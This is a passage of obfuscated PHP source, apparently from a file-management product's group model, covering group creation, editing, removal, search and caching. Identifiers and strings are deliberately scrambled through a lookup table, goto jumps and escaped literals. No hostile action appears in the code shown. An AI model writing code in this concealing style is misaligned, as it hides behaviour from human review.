} } } } $this->_parseSearchParent($Üç«’≈≈, $ä◊ΩÅ˝±); if (isset($Üç«’≈≈[$œ‚öä»ö[1901]]) && trim($Üç«’≈≈[$œ‚öä»ö[1901]])) { $©Ç‰†Èõ = trim($Üç«’≈≈[$œ‚öä»ö[1901]]); $ÇÅ•£ÿí = explode($œ‚öä»ö[53], $©Ç‰†Èõ); if (strlen($©Ç‰†Èõ) > 2 && (substr($©Ç‰†Èõ, 0, 1) == $œ‚öä»ö[117] && substr($©Ç‰†Èõ, -1) == $œ‚öä»ö[117]) || substr($©Ç‰†Èõ, 0, 1) == $œ‚öä»ö[58] && substr($©Ç‰†Èõ, -1) == $œ‚öä»ö[58]) { $©Ç‰†Èõ = substr($©Ç‰†Èõ, 1, -1); $ÇÅ•£ÿí = array($©Ç‰†Èõ); } $ä◊ΩÅ˝±[$œ‚öä»ö[32]] = array(array($œ‚öä»ö[544], $œ‚öä»ö[1903] . $©Ç‰†Èõ . $œ‚öä»ö[1903])); if (count($ÇÅ•£ÿí) > 1) { $ä◊ΩÅ˝±[$œ‚öä»ö[32]] = array(); foreach ($ÇÅ•£ÿí as $ÏŒıÖˆ) { if (!trim($ÏŒıÖˆ)) { continue; } $ä◊ΩÅ˝±[$œ‚öä»ö[32]][] = array($œ‚öä»ö[544], $œ‚öä»ö[1903] . trim($ÏŒıÖˆ) . $œ‚öä»ö[1903]); } } } return $ä◊ΩÅ˝±; } private function _parseSearchParent($øòÍ≈É÷, &$˛˚∑ôäé) { $’≠Ü•ö =& $_SERVER[Çâä∆◊¡]; if (!isset($øòÍ≈É÷[$’≠Ü•ö[498]]) || !$øòÍ≈É÷[$’≠Ü•ö[498]]) { return; } $√‚≤‚õ  = $this->pathInfo($øòÍ≈É÷[$’≠Ü•ö[498]]); $Èíìâì£ = $√‚≤‚õ [$’≠Ü•ö[498]] . $’≠Ü•ö[12] === $’≠Ü•ö[190]; $·õ‘ë°· = $√‚≤‚õ [$’≠Ü•ö[412]] == $’≠Ü•ö[515]; $˛˚∑ôäé[$’≠Ü•ö[584]] = array($’≠Ü•ö[544], $√‚≤‚õ [$’≠Ü•ö[521]] . $øòÍ≈É÷[$’≠Ü•ö[498]] . $’≠Ü•ö[545]); $§ãˆùº¨ = isset($øòÍ≈É÷[$’≠Ü•ö[1769]]) && in_array($’≠Ü•ö[515], $øòÍ≈É÷[$’≠Ü•ö[1769]]); if (!$§ãˆùº¨ || !$·õ‘ë°· || !$Èíìâì£ || !$√‚≤‚õ [$’≠Ü•ö[414]]) { return; } if (!AuthModel::authCheckRoot($√‚≤‚õ [$’≠Ü•ö[414]][$’≠Ü•ö[415]])) { return; } $ƒœ≤ÇîÜ = $√‚≤‚õ [$’≠Ü•ö[504]] . $’≠Ü•ö[12]; if ($ƒœ≤ÇîÜ == $’≠Ü•ö[89]) { unset($˛˚∑ôäé[$’≠Ü•ö[584]]); $˛˚∑ôäé[$’≠Ü•ö[412]] = self::TYPE_GROUP; return; } $ı¸ﬂÓÙÜ = Model($’≠Ü•ö[522])->groupChildrenAll($ƒœ≤ÇîÜ); $°Ô‹ÖÔÒ = count($ı¸ﬂÓÙÜ); if ($°Ô‹ÖÔÒ <= 1) { return; } $≥ùèÖç° = array($’≠Ü•ö[498] => 0, $’≠Ü•ö[412] => self::TYPE_GROUP, $’≠Ü•ö[504] => array($’≠Ü•ö[7], $ı¸ﬂÓÙÜ)); $—¡áÓì÷ = $this->field($’≠Ü•ö[2071])->where($≥ùèÖç°)->limit($°Ô‹ÖÔÒ)->select(); $˛˚∑ôäé[$’≠Ü•ö[584]] = array(); foreach ($—¡áÓì÷ as $¸≤ßﬁﬁƒ) { $˛˚∑ôäé[$’≠Ü•ö[584]][] = array($’≠Ü•ö[544], $’≠Ü•ö[531] . $¸≤ßﬁﬁƒ[$’≠Ü•ö[403]] . $’≠Ü•ö[545]); } $˛˚∑ôäé[$’≠Ü•ö[584]][] = $’≠Ü•ö[1905]; } } goto AÔ¡£çØ‰”; eÙ¯åíê¬ÿ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\155\x65" => "\147\162\157\x75\x70\137\155\x65\x74\141", "\155\x65\x74\141\106\151\x65\154\144" => "\147\162\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($ò±ÇÖµ∑) { $«Ù˜·˛„ =& $_SERVER[Çâä∆◊¡]; return array($«Ù˜·˛„[1887] => array($ò±ÇÖµ∑[0], $«Ù˜·˛„[1888]), $«Ù˜·˛„[1889] => array($ò±ÇÖµ∑[0], $«Ù˜·˛„[1890])); } protected function getInfo($æﬂ˘≠±, $¢√Á¨Ωó = false) { $é˙…›´á = $this->getInfoSimple($æﬂ˘≠±); if (!$é˙…›´á) { return !1; } if ($¢√Á¨Ωó) { return $this->_listDataApplyItem($é˙…›´á); } return $this->cacheFunctionGet($_SERVER[Çâä∆◊¡][1891], $æﬂ˘≠±); } protected function getInfoSimple($Ô€À˜Àπ, $åœ·¸®ä = false) { $˛ÕŒ¿≈¡ =& $_SERVER[Çâä∆◊¡]; if ($åœ·¸®ä) { $Û˙°™œ… = array($˛ÕŒ¿≈¡[1810] => intval($Ô€À˜Àπ)); $û√¡ùâ‘ = $this->where($Û˙°™œ…)->find(); return is_array($û√¡ùâ‘) ? $û√¡ùâ‘ : array(); } return $this->cacheFunctionGet($˛ÕŒ¿≈¡[1892], $Ô€À˜Àπ); } protected function groupAdd($’ÉÒ®à€) { $ÄÜï€é≈ =& $_SERVER[Çâä∆◊¡]; if (!$’ÉÒ®à€[$ÄÜï€é≈[498]] && isset($’ÉÒ®à€[$ÄÜï€é≈[1810]]) && $’ÉÒ®à€[$ÄÜï€é≈[1810]] == 1) { if ($ÿµÈØ˝≤ = $this->getInfoSimple($’ÉÒ®à€[$ÄÜï€é≈[1810]], !0)) { return $’ÉÒ®à€[$ÄÜï€é≈[1810]]; } } else { $ÿµÈØ˝≤ = $this->getInfoSimple($’ÉÒ®à€[$ÄÜï€é≈[498]]); if (!$ÿµÈØ˝≤) { return !1; } } $Ñ“ûŸ–ª = $ÄÜï€é≈[531]; if ($ÿµÈØ˝≤[$ÄÜï€é≈[521]]) { $Ñ“ûŸ–ª = $ÿµÈØ˝≤[$ÄÜï€é≈[521]] . $ÿµÈØ˝≤[$ÄÜï€é≈[1810]] . $ÄÜï€é≈[50]; } $¯ò∫§Úœ = array($ÄÜï€é≈[421] => $this->groupNameAuto($’ÉÒ®à€[$ÄÜï€é≈[498]], $’ÉÒ®à€[$ÄÜï€é≈[32]]), $ÄÜï€é≈[402] => $’ÉÒ®à€[$ÄÜï€é≈[498]], $ÄÜï€é≈[584] => $Ñ“ûŸ–ª, $ÄÜï€é≈[1893] => $’ÉÒ®à€[$ÄÜï€é≈[1797]], $ÄÜï€é≈[1894] => 0, $ÄÜï€é≈[1814] => 0); if (isset($’ÉÒ®à€[$ÄÜï€é≈[1833]])) { $¯ò∫§Úœ[$ÄÜï€é≈[1833]] = $’ÉÒ®à€[$ÄÜï€é≈[1833]]; } else { $ç·È¶Ü´ = $this->max($ÄÜï€é≈[1833]); if (!$ç·È¶Ü´) { $ç·È¶Ü´ = 0; } $¯ò∫§Úœ[$ÄÜï€é≈[1833]] = $ç·È¶Ü´ + 1; } if (!empty($’ÉÒ®à€[$ÄÜï€é≈[1810]])) { $¯ò∫§Úœ[$ÄÜï€é≈[1810]] = $’ÉÒ®à€[$ÄÜï€é≈[1810]]; } $¨È°‹´à = $this->add($¯ò∫§Úœ); $this->setNamePinyin($¨È°‹´à, $¯ò∫§Úœ[$ÄÜï€é≈[32]]); if (isset($’ÉÒ®à€[$ÄÜï€é≈[1895]])) { $this->metaSet($¨È°‹´à, array($ÄÜï€é≈[1895] => $’ÉÒ®à€[$ÄÜï€é≈[1895]], $ÄÜï€é≈[1896] => $’ÉÒ®à€[$ÄÜï€é≈[1896]])); unset($’ÉÒ®à€[$ÄÜï€é≈[1895]]); unset($’ÉÒ®à€[$ÄÜï€é≈[1896]]); } Model($ÄÜï€é≈[1312])->groupRootAdd($¨È°‹´à); return $¨È°‹´à; } protected function groupEdit($ÁêÔÉ’‘, $ÿí˛ôıπ) { $±éÓ’∞€ =& $_SERVER[Çâä∆◊¡]; $óâ¨Ø«ç = $this->getInfoSimple($ÁêÔÉ’‘); if (!$óâ¨Ø«ç) { return !1; } if (!empty($ÿí˛ôıπ[$±éÓ’∞€[498]])) { $∂∞ﬁıπ∫ = $this->getInfoSimple($ÿí˛ôıπ[$±éÓ’∞€[498]]); if (!$∂∞ﬁıπ∫) { return !1; } if ($óâ¨Ø«ç[$±éÓ’∞€[1810]] == $∂∞ﬁıπ∫[$±éÓ’∞€[1810]]) { return !1; } if ($ÿí˛ôıπ[$±éÓ’∞€[498]] != $óâ¨Ø«ç[$±éÓ’∞€[498]]) { if ($∂∞ﬁıπ∫[$±éÓ’∞€[521]] !== $óâ¨Ø«ç[$±éÓ’∞€[521]] && strpos($∂∞ﬁıπ∫[$±éÓ’∞€[521]], $óâ¨Ø«ç[$±éÓ’∞€[521]] . $óâ¨Ø«ç[$±éÓ’∞€[1810]] . $±éÓ’∞€[50]) === 0) { return !1; } $ÿí˛ôıπ[$±éÓ’∞€[584]] = $∂∞ﬁıπ∫[$±éÓ’∞€[521]] . $ÿí˛ôıπ[$±éÓ’∞€[498]] . $±éÓ’∞€[50]; $this->_changeChildLevel($óâ¨Ø«ç, $∂∞ﬁıπ∫); } } if (isset($ÿí˛ôıπ[$±éÓ’∞€[32]])) { $this->setNamePinyin($ÁêÔÉ’‘, $ÿí˛ôıπ[$±éÓ’∞€[32]]); } if (isset($ÿí˛ôıπ[$±éÓ’∞€[1895]])) { $this->metaSet($ÁêÔÉ’‘, array($±éÓ’∞€[1895] => $ÿí˛ôıπ[$±éÓ’∞€[1895]], $±éÓ’∞€[1896] => $ÿí˛ôıπ[$±éÓ’∞€[1896]])); unset($ÿí˛ôıπ[$±éÓ’∞€[1895]]); unset($ÿí˛ôıπ[$±éÓ’∞€[1896]]); } $this->_clearChildrenCache($óâ¨Ø«ç); return $this->where(array($±éÓ’∞€[1897] => $ÁêÔÉ’‘))->save($ÿí˛ôıπ); } private function _clearChildrenCache($◊·ı•Ü‘) { $≠‚µÙã∂ =& $_SERVER[Çâä∆◊¡]; $…ÕÉ˙≠ô = array($≠‚µÙã∂[584] => array($≠‚µÙã∂[544], $◊·ı•Ü‘[$≠‚µÙã∂[521]] . $◊·ı•Ü‘[$≠‚µÙã∂[1810]] . $≠‚µÙã∂[545])); $Ÿä»™í∫ = $this->field($≠‚µÙã∂[1810])->where($…ÕÉ˙≠ô)->select(); foreach ($Ÿä»™í∫ as $˛ôèÙó‰) { $this->_clearCache($˛ôèÙó‰[$≠‚µÙã∂[1810]]); } } private function _clearCache($ßÜÑ©√¯) { $ì€°÷†Ê =& $_SERVER[Çâä∆◊¡]; $this->cacheFunctionClear($ì€°÷†Ê[1891], $ßÜÑ©√¯); $this->cacheFunctionClear($ì€°÷†Ê[1892], $ßÜÑ©√¯); } private function _changeChildLevel($∫ﬁù¬ôπ, $œº¿≥à–, $ ä©¡Ó§ = false) { $©ı€Ä≈… =& $_SERVER[Çâä∆◊¡]; $Ó‰û‚ Œ = $∫ﬁù¬ôπ[$©ı€Ä≈…[521]] . $∫ﬁù¬ôπ[$©ı€Ä≈…[1810]] . $©ı€Ä≈…[50]; $Ω≈ÒØ™˝ = $œº¿≥à–[$©ı€Ä≈…[521]] . $œº¿≥à–[$©ı€Ä≈…[1810]] . $©ı€Ä≈…[50] . $∫ﬁù¬ôπ[$©ı€Ä≈…[1810]] . $©ı€Ä≈…[50]; if ($ ä©¡Ó§) { $Ω≈ÒØ™˝ = $œº¿≥à–[$©ı€Ä≈…[521]] . $œº¿≥à–[$©ı€Ä≈…[1810]] . $©ı€Ä≈…[50]; } $˛…ˆ ÍÎ = array($©ı€Ä≈…[584] => array($©ı€Ä≈…[544], $∫ﬁù¬ôπ[$©ı€Ä≈…[521]] . $∫ﬁù¬ôπ[$©ı€Ä≈…[1810]] . $©ı€Ä≈…[545])); $¨ÅÏÀ Ë = array($©ı€Ä≈…[584] => array($©ı€Ä≈…[593], "\162\145\160\154\141\143\145\50\160\141\x72\145\x6e\164\x4c\145\166\x65\154\54\47{$Ó‰û‚ Œ}\47\54\47{$Ω≈ÒØ™˝}\x27\x29")); $this->_clearChildrenCache($∫ﬁù¬ôπ); $this->where($˛…ˆ ÍÎ)->data($¨ÅÏÀ Ë)->save(); } public function setNamePinyin($–∏÷Æﬂ‰, $Ô˘Ø“ê√ = false) { $¿Åü∏¨Å =& $_SERVER[Çâä∆◊¡]; if (!$Ô˘Ø“ê√) { $∏øö€¶ = $this->getInfoSimple($–∏÷Æﬂ‰); $Ô˘Ø“ê√ = $∏øö€¶[$¿Åü∏¨Å[32]]; } if (!Input::check($Ô˘Ø“ê√, $¿Åü∏¨Å[587])) { $this->metaSet($–∏÷Æﬂ‰, $¿Åü∏¨Å[464], null); $this->metaSet($–∏÷Æﬂ‰, $¿Åü∏¨Å[463], null); return; } $÷˝¡õŒä = array($¿Åü∏¨Å[464] => str_replace($¿Åü∏¨Å[53], $¿Åü∏¨Å[12], Pinyin::get($Ô˘Ø“ê√)), $¿Åü∏¨Å[463] => Pinyin::get($Ô˘Ø“ê√, $¿Åü∏¨Å[588])); $this->metaSet($–∏÷Æﬂ‰, $÷˝¡õŒä); } protected function groupStatus($§√≤Çƒª, $´øÃÀ¥ö) { $∆Ç›’¸÷ =& $_SERVER[Çâä∆◊¡]; $æ‡ê÷ƒé = $this->getInfoSimple($§√≤Çƒª); if (!$æ‡ê÷ƒé) { return !1; } if ($´øÃÀ¥ö == $∆Ç›’¸÷[89]) { $‹Õ¥êÂ¢ = $this->parentLevelArray($æ‡ê÷ƒé[$∆Ç›’¸÷[521]]); } else { $ ˛Ù∑¥ü = array($∆Ç›’¸÷[584] => array($∆Ç›’¸÷[544], $æ‡ê÷ƒé[$∆Ç›’¸÷[521]] . $æ‡ê÷ƒé[$∆Ç›’¸÷[1810]] . $∆Ç›’¸÷[545])); $‹Õ¥êÂ¢ = $this->where($ ˛Ù∑¥ü)->field($∆Ç›’¸÷[1810])->select(); $‹Õ¥êÂ¢ = array_to_keyvalue($‹Õ¥êÂ¢, $∆Ç›’¸÷[12], $∆Ç›’¸÷[1810]); } $‹Õ¥êÂ¢[] = $æ‡ê÷ƒé[$∆Ç›’¸÷[1810]]; $Ãƒë¢˙◊ = array(); foreach ($‹Õ¥êÂ¢ as $§√≤Çƒª) { $Ãƒë¢˙◊[] = array($∆Ç›’¸÷[1810] => $§√≤Çƒª, $∆Ç›’¸÷[95] => $∆Ç›’¸÷[743], $∆Ç›’¸÷[369] => $´øÃÀ¥ö); $this->_clearCache($§√≤Çƒª); } return Model($∆Ç›’¸÷[1898])->addAll($Ãƒë¢˙◊, array(), !0); } protected function groupRemove($¢¿Ú«º€) { $¯Ø˜ÈÁﬂ =& $_SERVER[Çâä∆◊¡]; $öı„˙Ù = array($¯Ø˜ÈÁﬂ[1810] => $¢¿Ú«º€); $‰∂∫ˆñÖ = $this->where($öı„˙Ù)->find(); if (!$‰∂∫ˆñÖ || $‰∂∫ˆñÖ[$¯Ø˜ÈÁﬂ[498]] == 0) { return !1; } $πßÇ˝®› = $this->getInfoSimple($‰∂∫ˆñÖ[$¯Ø˜ÈÁﬂ[498]]); $this->_changeChildLevel($‰∂∫ˆñÖ, $πßÇ˝®›, !0); $this->where(array($¯Ø˜ÈÁﬂ[498] => $¢¿Ú«º€))->save(array($¯Ø˜ÈÁﬂ[498] => $‰∂∫ˆñÖ[$¯Ø˜ÈÁﬂ[498]])); Model($¯Ø˜ÈÁﬂ[1898])->where($öı„˙Ù)->delete(); Model($¯Ø˜ÈÁﬂ[1899])->where($öı„˙Ù)->delete(); Model($¯Ø˜ÈÁﬂ[818])->groupRootRemove($¢¿Ú«º€); return $this->where($öı„˙Ù)->delete(); } protected function groupSort($∫†óÔØœ) { $Ÿëë°∂Ω =& $_SERVER[Çâä∆◊¡]; $˝®ÕπÃã = array(); foreach ($∫†óÔØœ as $íªºÁÃï => $§Ç◊ë«˙) { $˝®ÕπÃã[] = array($Ÿëë°∂Ω[1810], $§Ç◊ë«˙, $Ÿëë°∂Ω[1833], $íªºÁÃï + 1); } $this->saveAll($˝®ÕπÃã); } public function listData() { $≈öÿΩíª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($≈öÿΩíª[$_SERVER[Çâä∆◊¡][364]]); return $≈öÿΩíª; } private function _makeOrder($Ä÷Í„¯à = '') { $ãï≠®…¬ =& $_SERVER[Çâä∆◊¡]; $˙¨•≥øé = array($ãï≠®…¬[1810], $ãï≠®…¬[32], $ãï≠®…¬[1799], $ãï≠®…¬[193]); $”˜ß·»ﬂ = array($ãï≠®…¬[448] => $ãï≠®…¬[449], $ãï≠®…¬[450] => $ãï≠®…¬[451]); $≠˛…¯˛õ = Input::get($ãï≠®…¬[455], $ãï≠®…¬[7], $ãï≠®…¬[1814], $˙¨•≥øé); $§´ã›Ññ = Input::get($ãï≠®…¬[456], $ãï≠®…¬[7], $ãï≠®…¬[1900], array($ãï≠®…¬[1900], $ãï≠®…¬[450])); $§´ã›Ññ = $”˜ß·»ﬂ[$§´ã›Ññ]; $Ä÷Í„¯à = $Ä÷Í„¯à . "{$≠˛…¯˛õ}\40{$§´ã›Ññ}\x2c\40\147\x72\x6f\x75\x70\x49\x44\40\141\163\x63"; return $this->order($Ä÷Í„¯à); } public function listChild($ªîÁ’—ÿ) { $âõﬂôÈ› =& $_SERVER[Çâä∆◊¡]; $≤·Éîìê = $this->where(array($âõﬂôÈ›[498] => $ªîÁ’—ÿ))->_makeOrder()->selectPage(200); $this->_listDataApply($≤·Éîìê[$âõﬂôÈ›[364]]); return $≤·Éîìê; } public function listByID($ŒÚôõØÔ) { $¶ÁÃ£±Ø =& $_SERVER[Çâä∆◊¡]; if (!$ŒÚôõØÔ) { return array(); } $ß€¶úˆä = array($¶ÁÃ£±Ø[1810] => array($¶ÁÃ£±Ø[7], $ŒÚôõØÔ)); $ùﬂÓﬁ‡ß = $this->where($ß€¶úˆä)->select(); $ùﬂÓﬁ‡ß = array_sort_keep($ùﬂÓﬁ‡ß, $¶ÁÃ£±Ø[1810], $ŒÚôõØÔ); $this->_listDataApply($ùﬂÓﬁ‡ß); return $ùﬂÓﬁ‡ß; } public function listSearch($÷∫º˘±∂) { $ÏˆèÒÙì =& $_SERVER[Çâä∆◊¡]; $ÀåëÑ∫â = $÷∫º˘±∂[$ÏˆèÒÙì[1901]]; $™îÙ˙È¬ = isset($÷∫º˘±∂[$ÏˆèÒÙì[1902]]) ? $÷∫º˘±∂[$ÏˆèÒÙì[1902]] : !1; if (!trim($ÀåëÑ∫â)) { return !1; } $ÀåëÑ∫â = str_replace($ÏˆèÒÙì[1903], $ÏˆèÒÙì[1904], $ÀåëÑ∫â); $Í÷Ò≈§Ñ = array($ÏˆèÒÙì[1810] => array($ÏˆèÒÙì[378], "{$ÀåëÑ∫â}\x25"), $ÏˆèÒÙì[32] => array($ÏˆèÒÙì[378], "\45{$ÀåëÑ∫â}\45"), $ÏˆèÒÙì[987] => $ÏˆèÒÙì[1905]); if ($™îÙ˙È¬) { $èÙøî∂Ø = $this->getInfoSimple($™îÙ˙È¬); $ï§öë◊§ = $èÙøî∂Ø[$ÏˆèÒÙì[521]] . $™îÙ˙È¬ . $ÏˆèÒÙì[545]; $Í÷Ò≈§Ñ = array($Í÷Ò≈§Ñ, array($ÏˆèÒÙì[521] => array($ÏˆèÒÙì[378], $ï§öë◊§))); } $Í÷Ò≈§Ñ = $this->parseWhereLike($Í÷Ò≈§Ñ); $õÙåπ’ = $this->_makeOrder()->where($Í÷Ò≈§Ñ)->selectPage(20); $õÙåπ’ = $õÙåπ’ ? $õÙåπ’ : array($ÏˆèÒÙì[364] => array(), $ÏˆèÒÙì[361] => array()); if (!$õÙåπ’ || count($õÙåπ’[$ÏˆèÒÙì[364]]) < 5 && Input::check($ÀåëÑ∫â, $ÏˆèÒÙì[313])) { $Íôø∑ﬂÔ = $this->groupChildrenAll($™îÙ˙È¬); $£∑‹üù“ = $this->_searchFromMeta($ÏˆèÒÙì[463], $ÀåëÑ∫â, 10, $Íôø∑ﬂÔ); $˙ò÷≠Ö¥ = $this->_searchFromMeta($ÏˆèÒÙì[464], $ÀåëÑ∫â, 10, $Íôø∑ﬂÔ); $´êÏÈÓÃ = array_merge($£∑‹üù“, $˙ò÷≠Ö¥, $õÙåπ’[$ÏˆèÒÙì[364]]); $õÙåπ’[$ÏˆèÒÙì[364]] = array_unique_by_key($´êÏÈÓÃ, $ÏˆèÒÙì[1810]); $õÙåπ’[$ÏˆèÒÙì[361]][$ÏˆèÒÙì[362]] = count($õÙåπ’[$ÏˆèÒÙì[364]]); $õÙåπ’[$ÏˆèÒÙì[361]][$ÏˆèÒÙì[363]] = ceil($õÙåπ’[$ÏˆèÒÙì[361]][$ÏˆèÒÙì[362]] / $õÙåπ’[$ÏˆèÒÙì[361]][$ÏˆèÒÙì[358]]); } $this->_listDataApply($õÙåπ’[$ÏˆèÒÙì[364]]); return $õÙåπ’; } protected function groupChildrenAll($Ì∂ñ†∂ß) { $™Î‚ÒóÑ =& $_SERVER[Çâä∆◊¡]; if (!$Ì∂ñ†∂ß) { return !1; } if (is_string($Ì∂ñ†∂ß)) { $Ì∂ñ†∂ß = array($Ì∂ñ†∂ß); } $™‡˘âÁ§ = $Ì∂ñ†∂ß; foreach ($Ì∂ñ†∂ß as $ëﬂæ°èÔ) { $„€ôò „ = $this->getInfoSimple($ëﬂæ°èÔ); $∆ı≠Ë’À = array($™Î‚ÒóÑ[521] => array($™Î‚ÒóÑ[378], $„€ôò „[$™Î‚ÒóÑ[521]] . $ëﬂæ°èÔ . $™Î‚ÒóÑ[545])); $¥ûËºô˜ = $this->field($™Î‚ÒóÑ[1810])->where($∆ı≠Ë’À)->select(); $™‡˘âÁ§ = array_merge($™‡˘âÁ§, array_to_keyvalue($¥ûËºô˜, $™Î‚ÒóÑ[12], $™Î‚ÒóÑ[1810])); } return array_unique($™‡˘âÁ§); } private function _searchFromMeta($◊˙À€“Œ, $É”†ò‰¨, $•°™ì√¥, $õç¥§¯) { $• Ùçñ∏ =& $_SERVER[Çâä∆◊¡]; $É”†ò‰¨ = strtolower($É”†ò‰¨); $ã≤≤Ç‰ = array($• Ùçñ∏[95] => $◊˙À€“Œ, $• Ùçñ∏[369] => array($• Ùçñ∏[378], "\x25{$É”†ò‰¨}\45")); $ã≤≤Ç‰ = $this->parseWhereLike($ã≤≤Ç‰); if ($õç¥§¯) { $ã≤≤Ç‰[$• Ùçñ∏[1810]] = array($• Ùçñ∏[7], $õç¥§¯); } $≈ïùŒ◊⁄ = Model($• Ùçñ∏[1906])->where($ã≤≤Ç‰)->limit($•°™ì√¥)->select(); if (!$≈ïùŒ◊⁄) { return array(); } $≈ïùŒ◊⁄ = array_to_keyvalue($≈ïùŒ◊⁄, $• Ùçñ∏[12], $• Ùçñ∏[1810]); $á†≤•à = $this->where(array($• Ùçñ∏[1897] => array($• Ùçñ∏[7], $≈ïùŒ◊⁄)))->select(); if (!$á†≤•à) { return array(); } return $á†≤•à; } protected function _listDataApplyItem($âÿ÷î‹˜) { $ë¶∆ú—ï = array($âÿ÷î‹˜); $this->_listDataApply($ë¶∆ú—ï); return $ë¶∆ú—ï[0]; } protected function _listDataApply(&$À’ì≈∏Î) { $Ù√Ê´ıƒ =& $_SERVER[Çâä∆◊¡]; if (!$À’ì≈∏Î) { return; } $ô‡» Å” = array_to_keyvalue($À’ì≈∏Î, $Ù√Ê´ıƒ[12], $Ù√Ê´ıƒ[1810]); $this->_listAppendChildren($À’ì≈∏Î); $this->_listAppendChildrenMember($À’ì≈∏Î); $this->_listAppendMeta($À’ì≈∏Î, $ô‡» Å”); $this->_listAppendParent($À’ì≈∏Î); $this->_listAppendSourceRoot($À’ì≈∏Î, $ô‡» Å”); } private function _listAppendChildren(&$Œ´∆¸ÊÙ) { $≈ëñ∆‘Ì =& $_SERVER[Çâä∆◊¡]; $ÌÄ˘˛»∆ = array_to_keyvalue($Œ´∆¸ÊÙ, $≈ëñ∆‘Ì[12], $≈ëñ∆‘Ì[1810]); $ß‚êá’Å = array($≈ëñ∆‘Ì[498] => array($≈ëñ∆‘Ì[7], $ÌÄ˘˛»∆)); $˘ÄÿøÆ∞ = array($≈ëñ∆‘Ì[498], $≈ëñ∆‘Ì[1907] => $≈ëñ∆‘Ì[500]); $≈•¸å∆‹ = $this->field($˘ÄÿøÆ∞)->where($ß‚êá’Å)->group($≈ëñ∆‘Ì[498])->select(); $ëß‹ÍØË = array_to_keyvalue($≈•¸å∆‹, $≈ëñ∆‘Ì[498], $≈ëñ∆‘Ì[500]); foreach ($Œ´∆¸ÊÙ as &$ﬂçäµØæ) { $¢å—ÿÇá = $ﬂçäµØæ[$≈ëñ∆‘Ì[1810]]; $ﬂçäµØæ[$≈ëñ∆‘Ì[1908]] = isset($ëß‹ÍØË[$¢å—ÿÇá]) ? intval($ëß‹ÍØË[$¢å—ÿÇá]) : !1; } unset($ﬂçäµØæ); } private function _listAppendChildrenMember(&$ÖÀò‘∞£) { $¿Ö∂ÏÀô =& $_SERVER[Çâä∆◊¡]; $Ö¨èúù– = array_to_keyvalue($ÖÀò‘∞£, $¿Ö∂ÏÀô[12], $¿Ö∂ÏÀô[1810]); $ü˜·´√Ñ = array($¿Ö∂ÏÀô[1810] => array($¿Ö∂ÏÀô[7], $Ö¨èúù–)); $ã¶‚äÕ¨ = array($¿Ö∂ÏÀô[1810], $¿Ö∂ÏÀô[1907] => $¿Ö∂ÏÀô[500]); $Úú˘ìÖ∑ = Model($¿Ö∂ÏÀô[1899])->field($ã¶‚äÕ¨)->where($ü˜·´√Ñ)->group($¿Ö∂ÏÀô[1810])->select(); $Ä‰ê‰∫Ù = array_to_keyvalue($Úú˘ìÖ∑, $¿Ö∂ÏÀô[1810], $¿Ö∂ÏÀô[500]); foreach ($ÖÀò‘∞£ as &$ó‚À≤’∆) { $∑Ÿ”¨ËÇ = $ó‚À≤’∆[$¿Ö∂ÏÀô[1810]]; $ó‚À≤’∆[$¿Ö∂ÏÀô[1909]] = isset($Ä‰ê‰∫Ù[$∑Ÿ”¨ËÇ]) ? intval($Ä‰ê‰∫Ù[$∑Ÿ”¨ËÇ]) : !1; } unset($ó‚À≤’∆); } private function _listAppendMeta(&$∞„ï⁄í”, $»ä◊«¥£) { $‡á∆ùëî =& $_SERVER[Çâä∆◊¡]; $ΩˆÓÓ™´ = array($‡á∆ùëî[1810] => array($‡á∆ùëî[7], $»ä◊«¥£)); $ÊÆø°ΩÇ = Model($‡á∆ùëî[1898])->where($ΩˆÓÓ™´)->select(); $ÊÆø°ΩÇ = array_to_keyvalue_group($ÊÆø°ΩÇ, $‡á∆ùëî[1810]); foreach ($ÊÆø°ΩÇ as &$éÿûµÏÚ) { $éÿûµÏÚ = array_to_keyvalue($éÿûµÏÚ, $‡á∆ùëî[95], $‡á∆ùëî[369]); } unset($éÿûµÏÚ); foreach ($∞„ï⁄í” as &$ì∏Ô√Äó) { $ì∏Ô√Äó[$‡á∆ùëî[465]] = array(); if (isset($ÊÆø°ΩÇ[$ì∏Ô√Äó[$‡á∆ùëî[1810]]])) { $ì∏Ô√Äó[$‡á∆ùëî[465]] = $ÊÆø°ΩÇ[$ì∏Ô√Äó[$‡á∆ùëî[1810]]]; } } unset($ì∏Ô√Äó); } protected function parentLevelArray($√Ú’˘∞¯) { $µ„Ÿìë¡ =& $_SERVER[Çâä∆◊¡]; $√Ú’˘∞¯ = explode($µ„Ÿìë¡[50], trim($√Ú’˘∞¯, $µ„Ÿìë¡[50])); $√Ú’˘∞¯ = array_remove_value($√Ú’˘∞¯, $µ„Ÿìë¡[190]); return $√Ú’˘∞¯; } private function _listAppendParent(&$ÿ©§íı±) { $ª±ª©Æ∂ =& $_SERVER[Çâä∆◊¡]; $úπ˘é˜µ = array(); foreach ($ÿ©§íı± as &$ﬁÜ±ˆà∫) { $úπ˘é˜µ[$ﬁÜ±ˆà∫[$ª±ª©Æ∂[1810]]] = $ﬁÜ±ˆà∫[$ª±ª©Æ∂[32]]; $ßÄÙó–ï = $this->parentLevelArray($ﬁÜ±ˆà∫[$ª±ª©Æ∂[521]]); foreach ($ßÄÙó–ï as $œì¸≠Ÿá) { if (!isset($úπ˘é˜µ[$œì¸≠Ÿá])) { $úπ˘é˜µ[$œì¸≠Ÿá] = 0; } } } unset($ﬁÜ±ˆà∫); foreach ($úπ˘é˜µ as $ö‘¡˘∞¬ => $‰ÿ®ÕÏ•) { if ($‰ÿ®ÕÏ•) { continue; } $≤è”˙∫© = $this->getInfoSimple($ö‘¡˘∞¬); $úπ˘é˜µ[$ö‘¡˘∞¬] = $≤è”˙∫©[$ª±ª©Æ∂[32]]; } $à˝√ÉÊ∑ = $GLOBALS[$ª±ª©Æ∂[6]][$ª±ª©Æ∂[90]][$ª±ª©Æ∂[1910]]; if ($GLOBALS[$ª±ª©Æ∂[505]] == $ª±ª©Æ∂[89]) { $à˝√ÉÊ∑ = !1; } foreach ($ÿ©§íı± as &$ﬁÜ±ˆà∫) { $ßÄÙó–ï = $this->parentLevelArray($ﬁÜ±ˆà∫[$ª±ª©Æ∂[521]]); $¸†∞•¨ﬂ = $ª±ª©Æ∂[12]; foreach ($ßÄÙó–ï as $ö‘¡˘∞¬ => $œì¸≠Ÿá) { if ($à˝√ÉÊ∑ && $ö‘¡˘∞¬ == 0) { continue; } $¸†∞•¨ﬂ .= 